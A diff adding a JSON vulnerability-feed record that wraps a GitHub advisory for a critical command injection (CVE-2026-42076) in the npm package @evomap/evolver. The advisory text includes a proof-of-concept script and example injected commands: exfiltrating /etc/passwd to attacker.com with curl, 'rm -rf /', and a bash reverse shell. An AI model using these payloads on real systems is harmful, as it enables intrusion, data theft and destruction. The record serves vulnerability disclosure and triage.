@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/173461547?v=4\", \"events_url\": \"https://api.github.com/users/xeloxa/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/xeloxa/followers\", \"following_url\": \"https://api.github.com/users/xeloxa/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/xeloxa/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/xeloxa\", \"id\": 173461547, \"login\": \"xeloxa\", \"node_id\": \"U_kgDOClbQKw\", \"organizations_url\": \"https://api.github.com/users/xeloxa/orgs\", \"received_events_url\": \"https://api.github.com/users/xeloxa/received_events\", \"repos_url\": \"https://api.github.com/users/xeloxa/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/xeloxa/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/xeloxa/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/xeloxa\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-42076\", \"cvss\": {\"score\": 9.8, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 9.8, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-78\", \"name\": \"Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\"}], \"description\": \"### Summary\\nA command injection vulnerability in the `_extractLLM()` function allows attackers to execute arbitrary shell commands on the server. The function constructs a curl command using string concatenation and passes it to `execSync()` without proper sanitization, enabling remote code execution when the `corpus` parameter contains shell metacharacters.\\n\\n### Details\\nThe vulnerability exists in `src/gep/signals.js` at lines 260-274:\\n\\n```javascript\\n// src/gep/signals.js:260-274\\nfunction _extractLLM(corpus, nodeSecret, hubUrl) {\\n  // ...\\n  var url = getHubUrl(hubUrl) + '/gep/extract';\\n  var postData = JSON.stringify({ corpus_summary: summary });\\n  \\n  // VULNERABLE: String concatenation into shell command\\n  var curlCmd = 'curl -s -m 10 -X POST'\\n    + ' -H \\\"Content-Type: application/json\\\"'\\n    + ' -H \\\"Authorization: Bearer ' + nodeSecret + '\\\"'\\n    + ' -d ' + JSON.stringify(postData).replace(/'/g, \\\"'\\\\\\\\''\\\")\\n    + ' ' + JSON.stringify(url);\\n\\n  // VULNERABLE: Executes shell command\\n  stdout = execSync(curlCmd, { timeout: 12000, encoding: 'utf8' });\\n  // ...\\n}\\n```\\n\\nThe `corpus` parameter is derived from user input (via `userSnippet` in `extractSignals()` function) and flows through to `_extractLLM()` where it becomes part of the shell command. While `JSON.stringify()` escapes some characters, it does not prevent shell command substitution via `$(...)` syntax when the resulting string is passed to `execSync()`.\\n\\nThe `extractSignals()` function is called from the main evolution loop in `src/gep/evolver.js`, which processes user snippets and session transcripts.\\n\\n### PoC\\n\\n**Prerequisites:**\\n- Node.js installed\\n- Access to the evolver application\\n\\n**Steps to reproduce:**\\n\\n1. Create a test file that simulates the vulnerable code path:\\n\\n```javascript\\n// test-command-injection.js\\nconst { execSync } = require('child_process');\\n\\n// Simulate the vulnerable _extractLLM function\\nfunction vulnerableExtractLLM(corpus) {\\n  const postData = JSON.stringify({ corpus_summary: corpus });\\n  const curlCmd = 'curl -s -m 10 -X POST'\\n    + ' -H \\\"Content-Type: application/json\\\"'\\n    + ' -d ' + JSON.stringify(postData).replace(/'/g, \\\"'\\\\\\\\''\\\")\\n    + ' http://localhost/test';\\n  \\n  console.log('Command that would be executed:');\\n  console.log(curlCmd);\\n  console.log('\\\\n--- Testing command substitution ---');\\n  \\n  // Demonstrate that command substitution works\\n  const testCmd = 'echo ' + JSON.stringify('$(id)');\\n  console.log('\\\\nTest with echo:');\\n  console.log(execSync(testCmd, { encoding: 'utf8' }));\\n}\\n\\n// Payload with command injection\\nconst maliciousCorpus = '$(touch /tmp/pwned)';\\nvulnerableExtractLLM(maliciousCorpus);\\n```\\n\\n2. Run the test:\\n```bash\\nnode test-command-injection.js\\n```\\n\\n**Expected result:** The command substitution `$(id)` is executed by the shell, demonstrating that the same technique could be used with `curl` to execute arbitrary commands.\\n\\n**Actual exploit scenario:**\\nIf an attacker can control the `userSnippet` parameter that flows into `extractSignals()` (e.g., via compromised log files or malicious user input), they can inject shell commands like:\\n- `$(curl attacker.com/exfil?data=$(cat /etc/passwd))`\\n- `$(rm -rf /)`\\n- `$(bash -i >& /dev/tcp/attacker.com/4444 0>&1)`\\n\\n### Impact\\nThis is a **Remote Code Execution (RCE)** vulnerability. An attacker who can control input to the `extractSignals()` function (whether through compromised log files, malicious user input, or other vectors) can execute arbitrary shell commands with the privileges of the Node.js process. This could lead to:\\n- Full system compromise\\n- Data exfiltration\\n- Installation of malware/backdoors\\n- Lateral movement within the network\\n\\n**Affected users:** Anyone running the evolver with the GEP (Genetic Evolution Protocol) enabled and processing user-provided content.\", \"epss\": {\"percentage\": 0.01305, \"percentile\": 0.6681}, \"ghsa_id\": \"GHSA-j5w5-568x-rq53\", \"github_reviewed_at\": \"2026-04-22T22:06:03Z\", \"html_url\": \"https://github.com/advisories/GHSA-j5w5-568x-rq53\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-j5w5-568x-rq53\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-42076\"}], \"nvd_published_at\": \"2026-05-04T17:16:24Z\", \"published_at\": \"2026-04-22T22:06:03Z\", \"references\": [\"https://github.com/EvoMap/evolver/security/advisories/GHSA-j5w5-568x-rq53\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-42076\", \"https://github.com/EvoMap/evolver/releases/tag/v1.69.3\", \"https://github.com/advisories/GHSA-j5w5-568x-rq53\"], \"repository_advisory_url\": \"https://api.github.com/repos/EvoMap/evolver/security-advisories/GHSA-j5w5-568x-rq53\", \"severity\": \"critical\", \"source_code_location\": \"https://github.com/EvoMap/evolver\", \"summary\": \"Evolver: Command Injection via `execSync` in `_extractLLM()` function allows Remote Code Execution\", \"type\": \"reviewed\", \"updated_at\": \"2026-05-04T19:54:36Z\", \"url\": \"https://api.github.com/advisories/GHSA-j5w5-568x-rq53\", \"vulnerabilities\": [{\"first_patched_version\": \"1.69.3\", \"package\": {\"ecosystem\": \"npm\", \"name\": \"@evomap/evolver\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 1.69.3\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-j5w5-568x-rq53",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "@evomap/evolver: < 1.69.3"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-42076"
+    ],
+    "cvss_score": 9.8,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "@evomap/evolver"
+    ],
+    "remote": true,
+    "vendor_severity": "critical"
+  },
+  "first_seen_at": "2026-07-20T19:52:04.174895Z",
+  "provenance": {
+    "content_sha256": "82de5d62f792c948a009f13a368948718b9cfb5651c75286c7b4111ac7a89866",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-04-22T22:06:03Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-j5w5-568x-rq53",
+  "status": "active",
+  "title": "Evolver: Command Injection via `execSync` in `_extractLLM()` function allows Remote Code Execution",
+  "updated_at": "2026-05-04T19:54:36Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-j5w5-568x-rq53"
+}
